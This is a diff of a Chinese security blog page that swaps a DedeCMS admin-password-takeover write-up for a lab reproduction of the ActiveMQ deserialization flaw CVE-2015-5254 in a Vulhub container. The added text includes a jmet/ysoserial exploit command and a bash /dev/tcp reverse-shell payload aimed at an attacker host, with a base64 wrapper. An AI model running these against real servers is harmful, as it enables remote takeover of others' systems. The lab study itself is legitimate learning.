@@ -15,32 +15,27 @@
 
 
 
-<meta name="description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
-<meta name="keywords" content="代码审计,CMS漏洞">
+<meta name="description" content="前言 PHP-Audit-Labs系列已经看到了最新的地方，所以在它还没有更新之前，先来看看一些常见的web服务的漏洞。 最后听到一首很有感触的歌，由于网易云没有版权外链，就只能换一个外链平台了。李荣浩的《年少有为》，假如我年少有为不自卑……">
+<meta name="keywords" content="Vulhub,漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DedeCMS代码审计Day3">
-<meta property="og:url" content="http://yoursite.com/2018/09/01/DedeCMS3/index.html">
+<meta property="og:title" content="Vulhub-ActiveMQ--反序列化漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/index.html">
 <meta property="og:site_name" content="Double--R blog">
-<meta property="og:description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
+<meta property="og:description" content="前言 PHP-Audit-Labs系列已经看到了最新的地方，所以在它还没有更新之前，先来看看一些常见的web服务的漏洞。 最后听到一首很有感触的歌，由于网易云没有版权外链，就只能换一个外链平台了。李荣浩的《年少有为》，假如我年少有为不自卑……">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/30.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/31.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/32.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/33.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/26.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/27.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/28.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/29.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/34.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/35.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/36.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/37.jpg">
-<meta property="og:updated_time" content="2018-09-01T12:43:00.196Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/39.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/7.png">
+<meta property="og:updated_time" content="2018-10-21T02:50:03.671Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DedeCMS代码审计Day3">
-<meta name="twitter:description" content="前言 今天复现一个最重要的漏洞，管理员后台密码修改">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg">
+<meta name="twitter:title" content="Vulhub-ActiveMQ--反序列化漏洞">
+<meta name="twitter:description" content="前言 PHP-Audit-Labs系列已经看到了最新的地方，所以在它还没有更新之前，先来看看一些常见的web服务的漏洞。 最后听到一首很有感触的歌，由于网易云没有版权外链，就只能换一个外链平台了。李荣浩的《年少有为》，假如我年少有为不自卑……">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/39.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +67,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>DedeCMS代码审计Day3 | Double--R blog</title>
+<title>Vulhub-ActiveMQ--反序列化漏洞 | Double--R blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -324,11 +319,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-DedeCMS3" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Vulhub-ActiveMQ-反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/09/01/DedeCMS3/" class="article-date">
-      <time datetime="2018-09-01T11:39:15.000Z" itemprop="datePublished">2018-09-01</time>
+      <a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/" class="article-date">
+      <time datetime="2018-10-21T01:34:19.000Z" itemprop="datePublished">2018-10-21</time>
 </a>
 
 
@@ -343,7 +338,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      DedeCMS代码审计Day3
+      Vulhub-ActiveMQ--反序列化漏洞
     </h1>
   
 
@@ -352,7 +347,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">836字</span>
+			<span class="post-count">761字</span>
 		</span>
 	</span>
 	
@@ -374,7 +369,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CMS漏洞/">CMS漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub/">Vulhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -385,43 +380,53 @@
       
           
         <p><strong>前言</strong></p>
-<p>今天复现一个最重要的漏洞，管理员后台密码修改</p>
+<p>PHP-Audit-Labs系列已经看到了最新的地方，所以在它还没有更新之前，先来看看一些常见的web服务的漏洞。</p>
+<p>最后听到一首很有感触的歌，由于网易云没有版权外链，就只能换一个外链平台了。李荣浩的《年少有为》，假如我年少有为不自卑……</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/7.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/39.jpg" alt=""></p>
 <a id="more"></a>
 <hr>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>上篇博客我复现了前台任意用户密码修改的漏洞，dedecms还有一个漏洞是管理员的前台密码修改会同时修改后台密码，通过前台任意用户密码修改的漏洞，我们就能修改管理员的密码。</p>
-<h2 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h2><p>前台任意用户密码重置漏洞的审计我前面有讲，这里主要看管理员前台重置其后台密码的代码。首先我们登陆前台，它的系统设置功能中有个基本资料更新，可以更新其前台密码，其文件是edit_baseinfo.php</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/30.jpg" alt=""></p>
-<p>我们去查看该文件的源码，重点是这一部分</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/31.jpg" alt=""></p>
-<p>当它判断当前账号为管理员是，为了方便管理员，它在修改前台密码的同时也会同时修改管理员的后台密码，这就带来了极大的风险。</p>
-<p>它判断当前账号是否为管理员的方式也很简单，当<code>$cfg_ml-&gt;fields[&#39;matt&#39;]</code>等于10时当前账号就是管理原账号，我们追踪<code>$cfg-ml-&gt;fields</code>，看它的值是如何获取的。</p>
-<p>在<code>DedeCMS\uploads\m\view.php</code>文件中，<code>$cfg_ml</code>调用了<code>Memberlogin</code>类，也就是控制会员登陆的类。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg_ml = new MemberLogin();</span><br></pre></td></tr></table></figure>
-<p>我们继追踪这个类</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/32.jpg" alt=""></p>
-<p>当这个类生成时，就会根据<code>M_ID</code>去查询会员表member，将查询结果赋值给<code>$this-&gt;fields</code>，我们去看一下表结构</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/33.jpg" alt=""></p>
-<p>里面有一个字段matt，代表账号权限，admin账号的权限为10，是最高权限。所以我们只要登陆到管理员的前台就能修改到后台密码。但是我们不知道管理员的密码，而且管理员的前台是不能直接登陆的。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>虽然dedecms对管理员的前台登陆做出了限制，但是我们利用前台任意用户密码修改漏洞是能绕过这些限制的。我们可以任意用户前台密码修改管理员的前台密码，不过这里的修改并不会更改后台，但是为了更好的用户体验，当密码修改成功后会自动跳转到当前账号的前台，我们可以在那里修改管理员的前台密码，这是后台密码也跟着变了。这里我只演示第二种方法。</p>
-<p>跟之前的步骤都是一样的，发送特定请求</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/26.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/27.jpg" alt=""></p>
-<p>更改密码</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/28.jpg" alt=""></p>
-<p>修改成功后等待跳转</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/29.jpg" alt=""></p>
-<p>跳转后成功登陆到管理员的前台</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/34.jpg" alt=""></p>
-<p>到系统设置里更改前台密码，这里有一个原登陆密码是必填的，虽然之前管理员的密码我们不知道，但是这并不影响，因为在跳转之前我们已经改过密码了。这里原密码填你修改的密码就行，邮箱随便填一个。这里我们管理员的最初的密码是admin，我们跳转前将它修改为123456，最后我们把它修改成了666</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/35.jpg" alt=""></p>
-<p>密码修改成功!</p>
-<p>如果这时候我们知道后台的目录，直接访问后台目录，然后用修改的密码登陆，就能登陆成为管理员</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/36.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/DedeCMS/37.jpg" alt=""></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我们这次使用的是ActiveMQ。Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p>
+<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<p>连接服务器，进入目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ../vulhub/activemq/CVE-2015-5254</span><br></pre></td></tr></table></figure>
+<p>创建镜像，启动容器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/1.png" alt=""></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>漏洞利用过程如下：</p>
+<ul>
+<li>构造可执行命令的序列化对象</li>
+<li>作为一个消息，发送到目标61616端口</li>
+<li>访问web管理页面，读取信息，触发漏洞</li>
+</ul>
+<p>这里我们使用ysoserial来构造序列化对象，ysoserial是一个Java反序列化工具框架，它包含常见的Java反序列化类型，可以生成一些payload。我们这里使用jmet，jmet自带ysoserial，我们先下载<a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">jmet的jar文件</a>，并在同目录下创建要给external文件夹（否则可能会爆文件夹不存在的错误）</p>
+<p>执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/2.png" alt=""></p>
+<p>这样我们会给目标ActiveMQ添加一个名为event的队列，我们访问<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>，默认账号admin，默认密码admin，看到这个队列中所有消息：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/3.png" alt=""></p>
+<p>当我们点击查看这条消息后即可触发命令执行，这时我们进行入容器：</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/4.png" alt=""></p>
+<p>可以看到/tmp/success已经成功创建。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/5.png" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>不过在这里我们需要一些小技巧来绕过Java的机制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`bash -c &#123;echo,payload的basse64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;`</span><br></pre></td></tr></table></figure>
+<p>然后我们是使用同样的命令将payload发送到61616端口。</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/6.jpg" alt=""></p>
+<p>然后我们查看这条消息，触发命令执行，这时我们在攻击机上监听端口，即可得到shell</p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/zhoubao/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/ActiveMQ/7.png" alt=""></p>
 <hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=429318&auto=1&height=66"></iframe></div>
+<p><strong>参考链接：</strong></p>
+<p><a href="http://www.cherrygk.cf/2018/08/06/CVE-2015-5254/" target="_blank" rel="noopener">ActiveMQ 反序列化漏洞（CVE-2015-5254）利用</a></p>
+<p><a href="http://www.freebuf.com/column/161188.html" target="_blank" rel="noopener">[应用安全]之ActiveMQ漏洞利用方法总结</a></p>
+<p><a href="https://vulhub.org/#/environments/activemq/CVE-2015-5254/" target="_blank" rel="noopener">ActiveMQ Deserialization Vulnerability (CVE-2015-5254)</a></p>
+<hr>
+<div align="center"><iframe frameborder="no" border="0" width="100" height="46" src="http://www.ytmp3.cn/down/50491.mp3"></iframe></div>
+
+
 
 
       
@@ -431,13 +436,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/09/01/DedeCMS3/">DedeCMS代码审计Day3</a></p>
+        <p><span>本文标题:</span><a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/">Vulhub-ActiveMQ--反序列化漏洞</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-09-01, 19:39:15</p>
-        <p><span>最后更新:</span>2018-09-01, 20:43:00</p>
+        <p><span>发布时间:</span>2018-10-21, 09:34:19</p>
+        <p><span>最后更新:</span>2018-10-21, 10:50:03</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/09/01/DedeCMS3/" title="DedeCMS代码审计Day3">http://yoursite.com/2018/09/01/DedeCMS3/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/09/01/DedeCMS3/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/" title="Vulhub-ActiveMQ--反序列化漏洞">http://yoursite.com/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -449,16 +454,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/09/01/JAVA1/">
-                    Java学习笔记（一）--Java语言基础
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/08/22/ThinkPHP11/">
-                    ThinkPHP框架学习--缓存
+                <a href="/2018/10/13/PHP-Audit-Labs-Day12/">
+                    PHP代码审计-误用htmlentities函数引发的漏洞
                 </a>
             </div>
         
@@ -470,7 +469,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞信息"><span class="toc-number">1.</span> <span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#审计过程"><span class="toc-number">2.</span> <span class="toc-text">审计过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
         
     </div>
     <style>
@@ -506,7 +505,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"DedeCMS代码审计Day3　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Vulhub-ActiveMQ--反序列化漏洞　| Double--R blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -526,15 +525,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/09/01/JAVA1/" title="上一篇: Java学习笔记（一）--Java语言基础">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/08/22/ThinkPHP11/" title="下一篇: ThinkPHP框架学习--缓存">
+            <a href="/2018/10/13/PHP-Audit-Labs-Day12/" title="下一篇: PHP代码审计-误用htmlentities函数引发的漏洞">
                 <i class="fa fa-angle-right"></i>
             </a>
         
